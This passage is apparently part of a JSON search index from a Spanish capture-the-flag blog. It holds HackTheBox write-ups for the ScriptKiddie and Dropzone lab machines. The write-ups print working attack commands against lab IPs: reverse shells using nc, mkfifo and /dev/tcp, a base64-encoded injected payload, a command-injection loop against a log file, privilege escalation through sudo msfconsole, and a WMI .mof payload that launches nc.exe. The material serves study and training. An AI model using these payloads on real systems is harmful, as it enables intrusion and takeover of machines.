eso‚Ä¶ Bueno bueno, hasta ac√° hemos llegado, y que el camino los guie hacia la gu√≠a del camino :P COMO SIEMPRE!! A romper todo! "
    }, {
    "id": 46,
    "url": "http://localhost:4000/htb/scriptkiddie",
    "title": "HackTheBox - ScriptKiddie",
    "body": "2021/06/05 - M√°quina Linux nivel f√°cil. Un servidor web que ejecuta comandos espec√≠ficos, pero que con uno de ellos podemos agregar un ‚Äútemplate‚Äù, ¬øqu√© puede salir mal? Inspeccionaremos un script al detalle y encontraremos una manera de cambiar el flujo del proceso para que haga lo que queramos :) Y validaremos permisos como sudo, con la sorpresa que ejecutando solo 2 l√≠neas somos root mediante msfconsole.  TL;DR (Spanish writeup): Creada por: 0xdf. Wenas, nos encontraremos con una web bastante traviesa que ejecuta comandos en el sistema (nada relacionado con command injection). Uno de los apartados nos permite generar payloads con msfvenom, pero tambi√©n nos da la opci√≥n de agregarle un template, buscando por internet nos aprovecharemos de una vulnerabilidad relacionada con templates en APK‚Äôs Android para conseguir una Shell como el usuario kid. Posteriormente inspeccionaremos a detalle un script al cual tenemos acceso, aprovecharemos una falla en √©l para sobreescribir un archivo que est√° leyendo y que ejecute una Shell, en este caso como el due√±o del script, pwn. Validando los permisos que tiene pwn usando sudo en el sistema (como si estuvi√©ramos ejecutando el proceso como root), vemos que puede ejecutar msfvenom, lo usamos para pasarnos a una Shell como root :) Clasificaci√≥n de la m√°quina: Juguetona, con tintes de vulnerabilidades conocidas pero poco real :(  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬øQu√© haremos?  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Realizaremos un escaneo de puertos para saber que servicios est√° corriendo la m√°quina. ‚ù≠ nmap -p- --open -v 10. 10. 10. 226 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 226# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 226 ()  Status: UpHost: 10. 10. 10. 226 ()  Ports: 22/open/tcp//ssh///, 5000/open/tcp//upnp///# Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 153. 39 secondsPerfecto, nos encontramos los servicios:       Puerto   Descripci√≥n         22   SSH       5000   UPnP: Conjunto de protocolos para la comunicaci√≥n de perif√©ricos en la red.    Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos informaci√≥n m√°s detallada de cada uno: ‚ù≠ nmap -p 22,5000 -sC -sV 10. 10. 10. 226 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Mon Feb 15 25:25:25 2021 as: nmap -p 22,5000 -sC -sV -oN portScan 10. 10. 10. 226Nmap scan report for 10. 10. 10. 226Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)5000/tcp open http  Werkzeug httpd 0. 16. 1 (Python 3. 8. 5)|_http-title: k1d'5 h4ck3r t00l5Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Feb 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 18. 92 secondsObtenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1       5000   HTTP   Werkzeug httpd 0. 16. 1 (Python)   Pues d√©mosle a cada servicio y veamos que podemos romper (: ‚Ä¶ En cuanto al puerto 22 y su versi√≥n no tenemos nada. Bas√°ndonos en el puerto 5000: Puerto 5000 ‚åñ: Varios apartados donde podemos interactuar y ejecutar instrucciones en el sistema que posteriormente se nos mostraran en el mismo sitio, como por ejemplo, hagamos el primero apartado donde realiza un escaneo de los 100 puertos m√°s populares: Pues exploremos y veamos como podemos colar alguna ejecuci√≥n de comandos de nuestro lado‚Ä¶ Despues de un rato intentando command injection no obtuve nada. Pero pensando en que estar√≠an haciendo los comandos por detr√°s y como se estar√≠an ejecutando, podemos enfocarnos en el apartado msfvenom.  msfvenom en pocas palabras nos permite crear payloads que podemos usar en muchos formatos y aplicaciones.  Creating Metasploit Payloads. ‚Ä¶ Explotaci√≥n #: Si nos fijamos es el √∫nico que nos permite interactuar con la ejecuci√≥n, podemos agreg√°ndole un template‚Ä¶ Jmm si buscamos en internet exploit template msfvenom, obtenemos esto:  Metasploit Framework 6. 0. 11 - msfvenom APK template command injection. Se trata de una vulnerabilidad que permite ejecutar comandos en la generaci√≥n de un APK para Android como template. Viendo el c√≥digo debemos cambiar los comandos que queremos ejecutar, intentemos establecer una Reverse Shell de una vez: . . . # Change me¬∑payload = 'nc 10. 10. 14. 47 4433 -e /bin/bash'. . . Nos ponemos en escucha: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Y ejecutamos el script para que nos genere el . apk malicioso con el que posteriormente ejecutaremos el proceso en la web: ‚ù≠ python3 msfvenom_APK. py [+] Manufacturing evil apkfilePayload: nc 10. 10. 14. 47 4433 -e /bin/bash-dname: CN='|echo bmMgMTAuMTAuMTQuNDcgNDQzMyAtZSAvYmluL2Jhc2g= | base64 -d | sh # adding: empty (stored 0%)jar signed. Warning: The signer's certificate is self-signed. [+] Done! apkfile is at /tmp/tmp6ns2_i9t/evil. apkDo: msfvenom -x /tmp/tmp6ns2_i9t/evil. apk -p android/meterpreter/reverse_tcp LHOST=127. 0. 0. 1 LPORT=4444 -o /dev/nullPerfecto, ahora (como dice al final) plasmemos la ejecuci√≥n pero en la web: Entonces si lo comparamos con la ejecuci√≥n por Shell, cada campo equivale a:  -x: El archivo APK malicioso (donde podemos subir el template).  LHOST: Debe ser localhost, ya que queremos ejecutar los comandos en la m√°quina para que desde ah√≠ nos genere la Reverse Shell. Damos en generate: Pero en la web obtenemos Something went wrong. As√≠ que probablemente sea que estamos con el binario nc que no soporta el argumento -e, intent√©moslo con ese binario:  Reverse Shell Cheat Sheet. . . . payload = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10. 10. 14. 47 4433 &gt;/tmp/f'. . . Ejecutamos script y obtenemos: Una Shell como el usuario kid, perfecto. Antes de seguir volvamos nuestra Shell una ¬´Shell¬ª completamente interactiva, para que podamos movernos entre comandos, regresar hist√≥rico, hacer CTRL + C sin miedo a perder la sesi√≥n y para estar m√°s c√≥modos. Escribimos (todo seguido): kid@scriptkiddie:~/html$ script /dev/null -c bash(CTRL + Z)‚ù≠ stty raw -echo‚ù≠ fg #(asi no lo veas se esta escribiendo)    resetTerminal type? xtermkid@scriptkiddie:~/html$ export TERM=xtermkid@scriptkiddie:~/html$ export SHELL=bashkid@scriptkiddie:~/html$ stty rows 43 columns 192 #(Este depende del tamano de tu pantalla (`$ stty -a`))Y listo hemos hecho el tratamiento de la TTY perfectamente.  Savitar te lo explica gr√°ficamente. Con kid tenemos la flag de user. ‚Ä¶ Movimiento lateral #: Dando vueltas vemos otro usuario: pwn, el cual es su home tiene un archivo interesante (el cual despues de alg√∫n testeo sabemos que se est√° ejecutando demasiado r√°pido) Explicaci√≥n script ü§™: Detall√©moslo a vel: kid@scriptkiddie:~$ cat /home/pwn/scanlosers. sh #!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d' ' -f3- | sort -u | while read ip; do  sh -c  nmap --top-ports 10 -oN recon/${ip}. nmap ${ip} 2&gt;&amp;1 &gt;/dev/null  &amp;doneif [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fiEl archivo hackers (si nos fijamos en el script que tenemos en la ruta /home/kid/html llamado app. py) guarda un TimeStamp y una IP de la persona que intenta ‚Äúhackear‚Äù el campo donde le ingres√°bamos algo a searchsploit: . . . with open('/home/kid/logs/hackers', 'a') as f:  f. write(f'[{datetime. datetime. now()}] {srcip}\n')return render_template('index. html', sserror= stop hacking me - well hack you back ) El script de pwn lee el archivo /home/kid/logs/hackers y lo guarda en la variable $log, (el archivo casi siempre est√° vac√≠o, si nos adelantamos vemos al final del script que lo limpia (echo -n &gt; $log),Emulando esto en nuestro entorno y leyendo el script (para saber como llega la variable srcip), est√° guardando esto en el archivo con esta sintaxis: [Fecha Hora] IPkid@scriptkiddie:~$ cat /home/kid/logs/hackers Toma el contenido y extrae la IP para hacerle un escaneo de los 10 puertos m√°s populares, esto usando sh llamando a nmap, pero ¬øc√≥mo?, hagamos un ejemplo r√°pido:Tenemos el archivo hackers con toda esta l√≠nea: 1 22 333 4444 55555 666666Al hacer el cut esta ‚Äúcortando‚Äù el archivo en pedazos, pero ¬øen cu√°ntos pedazos? Bueno, depende del car√°cter que le pasemos como separador en el argumento -d, en este caso el espacio: ' '. Pero ahora como le indicamos que nos muestre solo X √≠tem de toda la l√≠nea, pues digamos que queremos que solo nos muestre los n√∫meros 55555, pues se lo indicar√≠amos con el argumento f, entonces tendr√≠amos: ‚ù≠ cat hackers | cut -d ' ' -f3333    # Esta seria la IP que extraeriaHasta ac√° todo perfecto, peeeeeeeeeeeero si nos fijamos en nuestro cut y el del script vemos una diferencia bastante peque√±a pero muy significativa:  Nosotros hacemos cut -d ' ' -f3 El script hace cut -d ' ' -f3-La diferencia la vemos ac√°: ‚ù≠ cat hackers | cut -d ' ' -f3333‚ù≠ cat hackers | cut -d ' ' -f3-333 4444 55555 666666El s√≠mbolo - le indica que nos muestre desde nuestro corte hasta donde acabe la l√≠nea. Perfectooooo, podemos aprovecharnos de esto f√°cilmente, recordemos que tenemos:  El archivo /home/pwn/scanlosers. sh se est√° ejecutando autom√°ticamente muy r√°pido, Est√° leyendo el archivo /home/kid/logs/hackers (al cual tenemos acceso y podemos sobreescribirlo), Pero debemos ser r√°pidos, ya que al final del script lo est√° sobreescribiendo con valores nulos si el tama√±o del archivo es mayor a 0.  Sabiendo que todo lo que venga despues del corte en el tercer (3) espacio se est√° leyendo, podemos indicarle que no solo extraiga la IP, sino que nos ejecute nuestro payload:‚Ä¶ Entonces podemos crearnos un script que sobreescriba el contenido del archivo /home/kid/logs/hackers con nuestro payload: Como prueba inicial dig√°mosle que nos mande una traza hacia nuestra m√°quina con nc: #!/bin/bashwhile true; do  echo  1 2 3;nc 10. 10. 14. 47 4434  &gt; /home/kid/logs/hackersdone Sencillamente nos aprovechamos que toma toooooda la l√≠nea despues del 3. Entonces contamos el proceso y ejecutamos lo nuestro, terminamos (separamos) la ejecuci√≥n del comando con un simple ;. Como toda la vida :P Pong√°monos en escucha por el puerto 4434 y vemos si recibimos algo: ‚ù≠ nc -lvp 4434listening on [any] 4434 . . . Ejecutamos el script y estamos atentos :P Bien bien, recibimos la petici√≥n, as√≠ que aprovech√©monos de esto para generar una Shell :O ( Pueden probar de todo, si ejecutamos: . . . echo  1 2 3;id | nc 10. 10. 14. 47 4434  &gt; /home/kid/logs/hackers. . . Obtenemos: ‚ù≠ nc -lvp 4434listening on [any] 4434 . . . 10. 10. 10. 226: inverse host lookup failed: Host name lookup failureconnect to [10. 10. 14. 47] from (UNKNOWN) [10. 10. 10. 226] 52764uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)) Ahora si a por la Shell, solo quer√≠a mostrar eso :P Nuestro script quedar√≠a as√≠: #!/bin/bashwhile true; do  echo  1 2 3;bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 14. 47/4434 0&gt;&amp;1'  &gt; /home/kid/logs/hackersdoneY tendr√≠amos: Opa, tenemos una sesi√≥n como pwn ¬°Enumeremos pa vel! ‚Ä¶ Escalada de privilegios #: Si validamos que puede ejecutar pwn usando sudo (con permisos de root) en la m√°quina, nos encontramos: pwn@scriptkiddie:~$ sudo -lMatching Defaults entries for pwn on scriptkiddie:  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser pwn may run the following commands on scriptkiddie:  (root) NOPASSWD: /opt/metasploit-framework-6. 0. 9/msfconsoleEl binario msfconsole, veamos: pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6. 0. 9/msfconsoleY tenemos: msf6 &gt; id[*] exec: iduid=0(root) gid=0(root) groups=0(root)msf6 &gt; /bin/bash[*] exec: /bin/bashroot@scriptkiddie:/home/pwn# cdroot@scriptkiddie:~# lsroot. txt snapPerfecto, solo nos quedar√≠a ver las flags: ‚Ä¶ Linda m√°quina, sencilla (no hab√≠a prestado bastante atenci√≥n al script de pwn y estuve bastante estancado ah√≠), es muy CTF, pero bueno, se disfruta igual (: As√≠ que nada, est√° claro que nos vamos a frustrar en algunos momentos, pero lo importante es no rendirse y darle, darle pa lante. Muchas gracias y como siempre, a seguir rompiendo todo :* "
    }, {
    "id": 47,
    "url": "http://localhost:4000/htb/dropzone",
    "title": "HackTheBox - Dropzone",
    "body": "2021/06/01 - M√°quina Windows nivel dif√≠cil, bastante bastante entretenida, jugaremos con un servicio TFTP para escribir archivos arbitrariamente en el sistema (sin restricci√≥n), usaremos esa habilidad para jugar con objetos . mof y el servicio WMI, consiguiendo as√≠ pasar de una simple subida de archivos a una ‚Äúsimple‚Äù ejecuci√≥n remota de comandos en el sistema (: Finalmente debemos encontrar contenido oculto en archivos, esto mediante el feature ADS en Windows.  TL;DR (Spanish writeup): Creada por: eks &amp; rjesh. A quemaaaaaaaaaaaaaaaaaaaaaaaaaaarlo todoooooooooooooooooooooOO!! Listoooooones, nos encontraremos con un √∫nico puerto UDP, es un servicio TFTP llamado SolarWinds Free tftpd. Jugando con √©l conseguiremos tanto descargar como subir archivos al servidor, pero lo curioso es que el ‚Äúservidor‚Äù es el propio sistema, por lo que estaremos movi√©ndonos entre archivos del propio sistema (: Nos daremos cuenta de que podemos (de nuevo :P) tanto descargar como subir archivos en directorios donde no deber√≠amos poder, por lo que entendemos que o somos administradores directamente o estamos con un usuario que tiene permisos administrativos ;) Teniendo en cuenta esto, encontraremos la forma de ejecutar comandos remotamente aprovech√°ndonos de la subida de archivos. Jugando con el servicio WMI y un objeto . mof le indicaremos que al ser compilado nos ejecute alguna instrucci√≥n (llegaremos a obtener una Reverse Shell con ayuda de nc. exe, todo esto definido dentro del propio archivo . mof). (Ahondaremos en esto en su momento). Estando dentro de la m√°quina tendremos que jugar con el feature de NTFS llamado ADS o Alternative Data Stream el cual sirve como m√©todo para ocultar archivos dentro de otros archivos o directorios. Con esta premisa jugaremos con dos objetos interesantes, as√≠ encontraremos ocultas las flags tanto de user. txt como de root. txt en uno de ellos (: ‚Ä¶ Clasificaci√≥n de la m√°quina: Vulnerabilidades comunes o que tienen bastaaaaante informaci√≥n pero m√°s o menos realista :(  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Iremos volando entre monta√±as, surfeando en sus ojos llenos de l√°grimas‚Ä¶ ‚õ≤  Enumeraci√≥n.  Explotaci√≥n.  Movimiento lateral ADS -&gt; flags. ‚Ä¶ Enumeraci√≥n #: Empezaremos como siempre :P Enumeremos que puertos est√°s abiertos en la m√°quina: ‚ù± nmap -p- --open -v 10. 10. 10. 90. . . Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn. . . Entonces agregamos el par√°metro -Pn: ‚ù± nmap -p- --open -v -Pn 10. 10. 10. 90 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -Pn   Evita realizar Host Discovery, tal como el ping (P) y el DNS (n)       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   Pero el escaneo va muy lento, as√≠ que agregu√©mosle el par√°metro --min-rate, as√≠ aprovechamos para indicarle cu√°l es el m√≠nimo de paquetes que queremos que env√≠e en cada petici√≥n, le diremos que sean 3000: ‚ù± nmap -p- --open -v --min-rate=3000 -Pn 10. 10. 10. 90 -oG initScanPero como resultado vemos que no tenemos ning√∫n puerto TCP abierto‚Ä¶ Despues de jugar con algunos par√°metros de nmap, intentamos hacer un escaneo, pero de servicios UDP (con -sU), con este encontramos algo: ‚ù± nmap -sU -p- --open -v --min-rate=3000 -Pn 10. 10. 10. 90 -oG initScan‚ù± cat initScan# Nmap 7. 80 scan initiated Wed May 19 25:25:25 2021 as: nmap -sU -p- --open -v --min-rate=3000 -Pn -oG initScan 10. 10. 10. 90# Ports scanned: TCP(0;) UDP(65535;1-65535) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 90 ()  Status: UpHost: 10. 10. 10. 90 ()  Ports: 69/open/udp//tftp/// Ignored State: open|filtered (65534)# Nmap done at Wed May 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 51. 63 secondsY obtenemos:       Puerto   Descripci√≥n         69/udp   Al parecer el servicio TFTP   Ahora hagamos un escaneo de scripts y versiones, esto nos dar√° mucha m√°s informaci√≥n (a veces :P) del servicio en cuesti√≥n‚Ä¶ Si intentamos como normalmente lo hacemos, o sea contra un puerto TCP, nos indica: ‚ù± nmap -p69 -sC -sV -Pn 10. 10. 10. 90 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Obtenemos: ‚ù± cat portScan. . . PORT  STATE  SERVICE VERSION69/tcp filtered tftp. . . Y ahora indic√°ndole que es un escaneo de puertos UDP: ‚ù± nmap -sU -p69 -sC -sV -Pn 10. 10. 10. 90 -oN portScan‚ù± cat portScan. . . PORT  STATE SERVICE VERSION69/udp open tftp  SolarWinds Free tftpd. . . Bien, encontramos:       Puerto   Servicio   Versi√≥n         69/udp   TFTP   SolarWinds Free tftpd   Bueno, pues veamos de que se trata y como explotarlo (: ‚Ä¶ Puerto 69/UDP ‚åñ:  TFTP es un servidor para tranferir archivos de m√°quina remota a host y de host a m√°quina remota. No necesitamos estar autenticados y esta sirviendo sobre el protocolo UDP. En nuestro caso tenemos un servicio en espec√≠fico: SolarWinds Free, que nos ayuda con el tema de la transferencia de archivos de forma ‚Äúsegura‚Äù‚Ä¶ Investigando sobre ese software, encontramos cositas interesantes relacionadas con exploits y vulnerabilidades reportadas:  CVE-2006-1951 - Directory Path Traversal.  PoC Path Traversal TFTP.  Este no es exclusivo del CVE, pero muestra mucho mejor el Path Traversal en otro software TFTP. Entonces, vemos que existe una vulnerabilidad de Path Traversal, la cual nos permite interactuar con archivos del sistema o servidor a los cuales no deber√≠amos tener acceso. Empleando la herramienta tftp podemos jugar con el servidor para transferir archivos, tambi√©n usaremos rlwrap para poder movernos entre comandos y tener hist√≥rico de lo que hemos hecho. (Antes, agreguemos el dominio dropzone. htb (no lo hemos visto en ning√∫n lado, pero es el que tiene m√°s sentido) al archivo /etc/hosts contra la IP de la m√°quina, por si algo). ‚ù± rlwrap tftp dropzone. htb 69tftp&gt; statusConnected to dropzone. htb. Mode: netascii Verbose: off Tracing: offRexmt-interval: 5 seconds, Max-timeout: 25 secondstftp&gt; Validamos que estamos conectados :) Ahora intentemos subir un archivo: ‚ù± echo  si si como no, claro que si  &gt; hola. txttftp&gt; put hola. txtSent 29 bytes in 0. 2 secondstftp&gt;Podemos subir archivos‚Ä¶ Intentemos descargarlo con otro nombre: tftp&gt; get hola. txt chao. txtReceived 29 bytes in 0. 1 secondstftp&gt;‚ù± cat chao. txt si si como no, claro que siBien, as√≠ que tambi√©n podemos descargar archivos‚Ä¶ Dando saltos encontramos la ruta en la que estamos: tftp&gt; get siclaro. txtError code 1: Could not find file 'C:\siclaro. txt'. tftp&gt; Estamos en la ra√≠z del sistema al parecer, pero no sabemos que archivos hallan ni como movernos para llegar a probar el Path Traversal, as√≠, que, a, JUGAR! ‚Ä¶ Explotaci√≥n #: Explorando algunos exploits (poc) y movi√©ndonos con ellos (a√∫n sin saber que archivos puedan existir, pero probando algunos que est√°n por default en los sistemas Windows o que son importantes en √©l), logramos finalmente encontrar la forma de movernos entre archivos y de descargarlos: tftp&gt; get /Windows/System32/Ntdll. dllReceived 706048 bytes in 146. 0 secondstftp&gt;‚ù± file Ntdll. dll Ntdll. dll: MS-DOS executableEn nuestro caso descargamos el archivo Ntdll. dll (que podr√≠a haber sido cualquier otro, esto es m√°s de prueba), que da soporte interno a distintas funciones del sistema. As√≠ que:  Sabemos el formato para movernos entre archivos del sistema: get /&lt;path&gt; o put &lt;file&gt; /&lt;path&gt;.  Aparentemente podemos interactuar con archivos del sistema, o sea que tenemos privilegios para hacerlo, confirm√©moslo jugando con archivos sensibles en Windows. No podemos interactuar directamente con los objetos SAM y SYSTEM, ya que el sistema los est√° usando actualmente. Intentando descargar de la carpeta C:\Windows\repair, el backup del registro SAM como del registro SYSTEM, y jugando con la herramienta samdump2 para dumpear las credenciales guardadas, no logramos nada :( Peeeeeeeero, podemos corroborar que tenemos alg√∫n tipo de privilegio al subir archivos a sitios ‚Äúpeligrosos‚Äù y con habitual restricci√≥n: tftp&gt; put hola. txt /Windows/repair/holiwis. txtSent 29 bytes in 0. 2 secondstftp&gt; put hola. txt /Windows/System32/holiwis. txtSent 29 bytes in 0. 2 secondstftp&gt; put hola. txt /Windows/System32/config/holiwis. txtSent 29 bytes in 0. 2 secondstftp&gt; Perfecto, podemos subir archivos en sitios donde no deber√≠amos si no tuvi√©ramos privilegios. Bien, perooooo, como podemos aprovechar subir archivos para ejecutar comandos‚Ä¶ Llega la parte de b√∫squeda y captura üòé ‚Ä¶ Siguiendo la lista de archivos interesantes en los sistemas Windows, vemos uno llamado Boot. ini, el cual contiene informaci√≥n de la versi√≥n del sistema en el que estamos, ech√©mosle un ojo: tftp&gt; get /Boot. iniReceived 211 bytes in 0. 1 secondstftp&gt; ‚ù± cat Boot. ini [boot loader]timeout=30default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS[operating systems]multi(0)disk(0)rdisk(0)partition(1)\WINDOWS= Microsoft Windows XP Professional  /noexecute=optin /fastdetectVale, Microsoft Windows XP Professional, esto quiz√°s nos sirva para acotar nuestra b√∫squeda (: ‚Ä¶ Despues de buscar y buscar, encontramos una vulnerabilidad locochona (es de otro servidor FTP llamado Open-FTPD), lo interesante est√° en su descripci√≥n:  Arbitrary file upload - OpenFTPD 1. 2. Indica que la vulnerabilidad permite escribir cualquier tipo de archivo en cualquier directorio (esto ya lo sab√≠amos), peeeero que es posible conseguir ejecuci√≥n remota de comandos mediante un archivo . mof, √©l habilitara el servicio WMI (Management Instrumentation service) para que ejecute un archivo . exe (que ser√≠a nuestro payload) üò≤ Pufff pues es lo que necesitamos, pero claro, est√° relacionado con otro software :( y est√° creado para ser ejecutado con metasploit‚Ä¶ Antes de seguir exploremos que es un archivo . mof y su interacci√≥n con el servicio WMI, as√≠ nos queda m√°s claro lo que queremos hacer y como es que funciona. Ca√≠ en un Rabbit Hole, pero encontr√© un lindo recurso que no quer√≠a perder:  Intro to file operation abuse on Windows. ‚Ä¶ Buceando entre archivos . mof y el servicio WMI: ‚Ä¶ WMI (Windows Management Instrumentation)Hablemos primero del servicio WMI:  Windows Management Instrumentation (WMI) es una implemtaci√≥n del conjutno de tecnologias WBEM (Web-Based Enterprise Management) que habilita a los adminsitradores del sistema ejecutar tareas tanto local como remotamente. B√°sicamente es eso, pero si pensamos como atacantes puede ser muy peligroso, ¬øno? Ac√° una descripci√≥n gr√°fica de la arquitectura con la que cuenta WMI: (Vemos algunos servicios con los que hemos interactuado en otras m√°quinas, como por ejemplo WinRM (evil-winrm))  Tomada de: hackplayers. com/ataques_wmi. El poder que toma WMI como atacantes llega cuando pensamos en persistencia, tener acceso ilimitado a un sistema por ejemplo, o ejecutar X tarea en cualquier momento sin preocuparnos de nada. Ac√° entran en juego los archivos . mof y una caracter√≠stica necesaria en cada uno de ellos:  Requieren el uso de 3 clases, cada clase tiene su uso:     __EventFilter: Almacenar el payload que queremos ejecutar. (Usa WMI Query Languaje (WQL) para detectar el evento   __EventConsumer: El evento que har√° ejecutar lo que tenemos en la clase 1.    __FilterToConsumerBinding: Relacionar las 2 clases anteriores (tanto el evento como la acci√≥n).    Algunos recursos para leer sobre WMI y las clases del archivo . mof:  Entendiendo los ataques con WMI.  WMI Permanent Event Subscription - MOF files. Este recurso tiene muchas referencias guapas para profundizar como nunca en estos temas, a ojear ;)Peero, los qu√© m√°s destaque (y us√©) fueron estos dos:  Playing with MOF files on Windows.  Persistence WMI event subscription. Bien, como dije antes, estas tres clases est√°n incluidas en un archivo . mof (Managed object format), pero, ¬øqu√© es esto y como interact√∫a con WMI? MOF (Managed object format)MOF es el lenguaje que se usa para describir las clases de los modelos de informaci√≥n com√∫n, abreviados como CIM:  Est√°ndar abierto que define c√≥mo los elementos administrados en un entorno de TI se representan como un conjunto com√∫n de objetos y relaciones entre ellos. CIM. Entonces, la interacci√≥n se logra gracias a las clases del archivo . mof que son interpretadas por el servicio WMI cuando el objeto . mof es compilado‚Ä¶ Ac√° encontramos que para la compilaci√≥n del objeto a primera vista era necesario hacerlo manualmente, esto mediante el programa Mofcomp. exe alojado en el repositorio WMI, peeeeeeeeeeeeeeeeeeeeero apoy√°ndonos en los recursos, vemos esto:  a MOF file that is put in the %SystemRoot%\System32\wbem\mof\ directory is automatically compiled and registered into the WMI repository. Opa, as√≠ que solo necesitar√≠amos colocar nuestro objeto en esa ruta y no deber√≠amos preocuparnos por su compilaci√≥n (: Un ejemplo que nos da poppopret es el muy conocido Stuxnet que fue capaz de controlar y juguetear con sistemas industriales (SCADA) reprogramando tareas y creando otras, algunas de ellas usando el mismo tipo de ataque, ellos subieron:    %SystemRoot%\System32\winsta. exe: Stuxnet‚Äôs main module  %SystemRoot%\System32\wbem\mof\sysnullevnt. mof: MOF file that will automatically compile itself and that contains the code needed to execute the winsta. exe file when some events occur.  Linda vuln‚Ä¶ En resumen, el objeto . mof tiene clases, entre ellas generar ‚Äúpasos‚Äù e ‚Äúinstrucciones‚Äù de las cuales nos podemos aprovechar, con las instrucciones dentro, solo necesitar√≠amos colocar ese objeto en la ruta anterior para que se autocompile y ejecute lo que queramos que ejecute :P ‚Ä¶ Pues listos, hemos ahondado en estos dos temas y tenemos claro la funci√≥n y el porqu√©, sigamos jugando con la vulnerabilidad del OpenFTPD 2. 1: Investigando el exploit que usa (exploit/windows/ftp/open_ftpd_wbem) seg√∫n el PoC, encontramos el c√≥digo fuente:  open_ftpd_wbem. rbLeyendo el script, vemos el llamado a una funci√≥n, generate_mof(): (que claramente es llamativa para nosotros, porque si es gen√©rica, nos puede servir como base para el objeto . mof) Donde toma como argumentos, el nombre que le queremos poner al archivo . mof y el nombre del archivo . exe‚Ä¶ Dando clic sobre la funci√≥n, nos muestra:  Defined in lib/msf/core/exploit/wbem_exec. rb. Y si ahora damos clic sobre esa referencia llegamos a la fuente del archivo wbem_exec. rb: Oko, d√°ndole vueltas al archivo, vemos que el contenido del objeto . mof est√° dentro de la variable mof e indica su fin cuando encuentra la cadena EOT, entonces, tomemos tooodas esas l√≠neas y copi√©moslas a un archivo de nuestro sistema . mof. ‚ù± wc -l payload. mof 62 payload. mofVemos varias partes donde toma valores de variables, modifiquemos esas partes para alojar nuestros valores: @EXE@: que es donde va el nombre del archivo . exe, cambi√©moslo por nc. exe: En la instrucci√≥n n√∫mero 1, buscamos la cadena @EXE@ en el payload, es la n√∫mero 2 buscamos la cadena nc. exe, como no hay match nos responde con error y en la n√∫mero 3 jugamos con sed para jugar con el contenido del archivo, donde yo creo que la mayor√≠a se entiende y la duda puede estar en la g, ella le indica a sed que haga el remplazo en todos los matchs que encuentre. Para decirle que haga el cambio permanente, le tenemos que indicar el par√°metro -i a sed (: Ahora en esta instancia, Instance of ActiveScriptEventConsumer as $cons, modificamos la l√≠nea donde esta nc. exe para que nos haga una petici√≥n a nuestra m√°quina: . . . ScriptText = . . . ns. Run(\\ nc. exe 10. 10. 14. 10 4433\\ );} catch. . . . . . :) #{mofname}: ac√° va el nombre del objeto . mof: ‚ù± sed -i 's/#{mofname}/payload. mof/g' payload. mof@CLASS@: que al parecer toma el valor de la clase, pongamos cualquiera: ‚ù± sed 's/@CLASS@/eAcabo/g' payload. mof | grep -n eAcabo2:class MyClasseAcabo29: ScriptText =  \\ntry {var s = new ActiveXObject(\\ Wscript. Shell\\ );\\ns. Run(\\ nc. exe\\ );} catch (err) {};\\nsv = GetObject(\\ winmgmts:root\\\\\\\\cimv2\\ );try {sv. Delete(\\ MyClasseAcabo\\ );} catch (err) {};try {sv. Delete(\\ __EventFilter. Name='instfilt'\\ );} catch (err) {};try {sv. Delete(\\ ActiveScriptEventConsumer. Name='ASEC'\\ );} catch(err) {}; ;40: Query =  SELECT * FROM __InstanceCreationEvent WHERE TargetInstance. __class = \\ 